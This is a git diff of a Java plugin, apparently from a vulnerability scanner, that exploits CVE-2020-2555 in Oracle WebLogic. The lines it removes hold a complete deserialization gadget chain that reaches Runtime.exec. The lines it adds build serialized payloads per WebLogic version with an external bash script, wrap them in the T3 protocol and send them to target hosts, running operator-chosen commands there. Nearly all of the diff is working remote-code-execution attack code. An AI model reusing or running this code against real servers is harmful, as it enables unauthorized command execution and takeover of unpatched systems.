@@ -11,10 +11,9 @@ import com.gbw.scanner.plugins.scripts.GBWScanScriptTool;
 import com.gbw.scanner.plugins.scripts.weblogic.serial.Serializables;
 import com.gbw.scanner.sink.SinkQueue;
 import com.gbw.scanner.utils.ByteDataUtils;
+import com.gbw.scanner.utils.FileUtils;
+import com.gbw.scanner.utils.ProcessUtils;
 import com.gbw.scanner.utils.SSLUtils;
-import com.tangosol.util.extractor.ChainedExtractor;
-import com.tangosol.util.extractor.ReflectionExtractor;
-import com.tangosol.util.filter.LimitFilter;
 import com.xmap.api.utils.TextUtils;
 import org.apache.commons.cli.CommandLine;
 import org.apache.commons.cli.Options;
@@ -23,21 +22,112 @@ import org.slf4j.LoggerFactory;
 import weblogic.rjvm.JVMID;
 import weblogic.security.acl.internal.AuthenticatedUser;
 
-import javax.management.BadAttributeValueExpException;
 import java.io.IOException;
 import java.lang.reflect.Constructor;
 import java.lang.reflect.Field;
 import java.net.InetAddress;
+import java.nio.file.Files;
+import java.nio.file.Paths;
+import java.util.ArrayList;
+import java.util.List;
 
 public class GBWScanCVE20202555Script implements GBWScanScript {
 
     private static final Logger log = LoggerFactory.getLogger(GBWScanCVE20202555Script.class);
     private GBWScanCVE20202555Config config;
+    private List<PayloadEntry> payloadEntries;
+    private PayloadEntry defaultPayload;
 
-    public GBWScanCVE20202555Script(GBWScanCVE20202555Config config){
+    public GBWScanCVE20202555Script(GBWScanCVE20202555Config config) throws Exception {
 
         this.config = config;
+        this.payloadEntries = new ArrayList<>();
+        this.defaultPayload = null;
+
+        if(config.getVersions()!=null&&config.getVersions().length>0) {
+
+            init();
+        }
+
     }
+
+    public void init() throws Exception{
+
+        for (String version : config.getVersions()) {
+
+            PayloadEntry payloadEntry = new PayloadEntry(version, makePayload(version));
+            payloadEntries.add(payloadEntry);
+
+            if (!TextUtils.isEmpty(config.getDefaultVersion()) && version.equals(config.getDefaultVersion()))
+                defaultPayload = payloadEntry;
+        }
+    }
+
+    private byte[] makePayload(String version) throws IOException {
+
+        String cmdPath = String.format("%s/%s/run",config.getPayloadScriptDir(),version);
+        String filePath = String.format("/opt/data/weblogic_%s.data",version);
+
+        String[] cmds = new String[4];
+
+        cmds[0] = "/bin/bash";
+        cmds[1] = cmdPath;
+        cmds[2] = filePath;
+        StringBuffer rcmd = new StringBuffer();
+        String[] cmdArr = config.getCmds();
+
+        for(int i = 0;i<cmdArr.length;i++){
+
+            rcmd.append(cmdArr[i]);
+            if(i!=cmdArr.length-1)
+                rcmd.append(",");
+        }
+
+        cmds[3] = rcmd.toString();
+
+        String proc = ProcessUtils.executeCommand(cmds);
+
+        if(!TextUtils.isEmpty(proc))
+            log.info(String.format("Make weblogic payload for version:%s,path:%s,proc:%s",version,filePath,proc));
+        else
+            proc = "none";
+
+        if(!FileUtils.hasContent(filePath)){
+
+            log.error(String.format("Make weblogic payload for version:%s,path:%s,proc:%s failed!",version,filePath,proc));
+            throw new IOException("make weblogic payload failed!");
+        }
+
+        return Files.readAllBytes(Paths.get(filePath));
+    }
+
+    private class PayloadEntry{
+
+        private String version;
+        private byte[] payload;
+
+        public PayloadEntry(String version,byte[] payload){
+
+            this.version = version;
+            this.payload = payload;
+        }
+
+        public String getVersion() {
+            return version;
+        }
+
+        public void setVersion(String version) {
+            this.version = version;
+        }
+
+        public byte[] getPayload() {
+            return payload;
+        }
+
+        public void setPayload(byte[] payload) {
+            this.payload = payload;
+        }
+    };
 
     @Override
     public GBWScanScriptCommonConfig getConfig() {
@@ -49,58 +139,7 @@ public class GBWScanCVE20202555Script implements GBWScanScript {
         return true;
     }
 
-    private byte[] makePayload() throws Exception{
 
-        // Runtime.class.getRuntime()
-        ReflectionExtractor extractor1 = new ReflectionExtractor(
-                "getMethod",
-                new Object[]{"getRuntime", new Class[0]}
-        );
-
-        // get invoke() to execute exec()
-        ReflectionExtractor extractor2 = new ReflectionExtractor(
-                "invoke",
-                new Object[]{null, new Object[0]}
-        );
-
-        // invoke("exec","calc")
-        ReflectionExtractor extractor3 = new ReflectionExtractor(
-                "exec",
-                new Object[]{config.getCmds()}
-        );
-
-        ReflectionExtractor[] extractors = {
-                extractor1,
-                extractor2,
-                extractor3,
-        };
-
-        ChainedExtractor chainedExtractor = new ChainedExtractor(extractors);
-        LimitFilter limitFilter = new LimitFilter();
-
-        //m_comparator
-        Field m_comparator = limitFilter.getClass().getDeclaredField("m_comparator");
-        m_comparator.setAccessible(true);
-        m_comparator.set(limitFilter, chainedExtractor);
-
-        //m_oAnchorTop
-        Field m_oAnchorTop = limitFilter.getClass().getDeclaredField("m_oAnchorTop");
-        m_oAnchorTop.setAccessible(true);
-        m_oAnchorTop.set(limitFilter, Runtime.class);
-
-        // BadAttributeValueExpException toString()
-        // This only works in JDK 8u76 and WITHOUT a security manager
-        // https://github.com/JetBrains/jdk8u_jdk/commit/af2361ee2878302012214299036b3a8b4ed36974#diff-f89b1641c408b60efe29ee513b3d22ffR70
-        BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(null);
-        Field field = badAttributeValueExpException.getClass().getDeclaredField("val");
-        field.setAccessible(true);
-        field.set(badAttributeValueExpException, limitFilter);
-
-        // serialize
-        byte[] payload = Serializables.serialize(badAttributeValueExpException);
-
-        return payload;
-    }
 
     private byte[] makeT3ProtoPayload(byte[] payload) throws Exception{
 
@@ -223,7 +262,28 @@ public class GBWScanCVE20202555Script implements GBWScanScript {
       //  System.out.println(version);
         if(TextUtils.isEmpty(version)||!version.contains("HELO:"))
             return null;
-        return version.replace("HELO:","").replace(".false","");
+        return version.replace("HELO:","").replace(".false","").replace(".true","");
+    }
+
+    private  byte[] findPayload(String version){
+
+        String nversion = version.replace(".","");
+
+        for(PayloadEntry entry:payloadEntries){
+
+            if(nversion.contains(entry.version)){
+
+                log.info(String.format("Find a weblogic payload for version:%s",version));
+                return entry.getPayload();
+            }
+        }
+
+        if(defaultPayload!=null) {
+            log.info(String.format("use default payload version:%s for version:%s",defaultPayload.getVersion(),version));
+            return defaultPayload.getPayload();
+        }
+
+        return null;
     }
 
     @Override
@@ -241,25 +301,30 @@ public class GBWScanCVE20202555Script implements GBWScanScript {
             version = sendT3Header(connection,host);
             if(!TextUtils.isEmpty(version)){
                 /*make attack payload*/
-                byte[] payload = makePayload();
-                byte[] attackData = makeT3ProtoPayload(payload);
 
-                /*send attack payload*/
-                connection.send(attackData);
-                connection.read(recvData);
+                byte[] payload = findPayload(version);
 
-                //System.out.println(new String(recvData));
-                /*ok*/
-                GBWScanCVE20202555Result result = new GBWScanCVE20202555Result(config,host);
+                if(payload!=null) {
 
-                log.warn(String.format("Found a weblogic bugs CVE_2020_2555,in ip:%s,port:%d,version:%s",host.getHost(),host.getPort(),version));
+                    byte[] attackData = makeT3ProtoPayload(payload);
 
-                result.setVersion(version);
-                result.setCmds(config.getCmds());
-                if(sinkQueue!=null)
-                    sinkQueue.put(result);
-                else
-                    System.out.println(String.format("Found a weblogic bugs CVE_2020_2555,in ip:%s,port:%d,version:%s",host.getHost(),host.getPort(),version));
+                    /*send attack payload*/
+                    connection.send(attackData);
+                    connection.read(recvData);
+
+                    //System.out.println(new String(recvData));
+                    /*ok*/
+                    GBWScanCVE20202555Result result = new GBWScanCVE20202555Result(config, host);
+
+                    log.warn(String.format("Found a weblogic bugs CVE_2020_2555,in ip:%s,port:%d,version:%s", host.getHost(), host.getPort(), version));
+
+                    result.setVersion(version);
+                    result.setCmds(config.getCmds());
+                    if (sinkQueue != null)
+                        sinkQueue.put(result);
+                    else
+                        System.out.println(String.format("Found a weblogic bugs CVE_2020_2555,in ip:%s,port:%d,version:%s", host.getHost(), host.getPort(), version));
+                }
             }
         }catch (Exception e){
 
@@ -275,12 +340,18 @@ public class GBWScanCVE20202555Script implements GBWScanScript {
 
     private static void runMain(String[] args) throws Exception {
 
+        String payloadDir = "/opt/scan/GBWScanner/weblogic/";
+        String defaultVersion = "12130";
+        String[] versions = new String[]{"12130","12213","12214"};
         String[] cmds = new String[]{"/bin/bash","-c","touch /tmp/test.data"};
 
         Options opts = new Options();
         GBWScanCVE20202555Config config = new GBWScanCVE20202555Config();
 
         opts.addOption("cmd",true,"weblogic run cmds</bin/bash,-c,touch /tmp/test.data>");
+        opts.addOption("dir",true,"weblogic payload dir");
+        opts.addOption("versions",true,"weblogic versions:<xxx,vvv,....>");
+        opts.addOption("dversion",true,"weblogic default version");
 
         GBWScanCVE20202555Script scanCVE20202555Script = new GBWScanCVE20202555Script(config);
 
@@ -292,7 +363,21 @@ public class GBWScanCVE20202555Script implements GBWScanScript {
              cmds = cli.getOptionValue("cmd").split(",");
         }
 
+        if(cli.hasOption("dir"))
+            payloadDir = cli.getOptionValue("dir");
+
+        if(cli.hasOption("versions"))
+            versions = cli.getOptionValue("versions").split(",");
+
+        if(cli.hasOption("dversion"))
+            defaultVersion = cli.getOptionValue("dversion");
+
+        config.setPayloadScriptDir(payloadDir);
+        config.setVersions(versions);
+        config.setDefaultVersion(defaultVersion);
         config.setCmds(cmds);
+
+        scanCVE20202555Script.init();
 
         tool.start();
     }
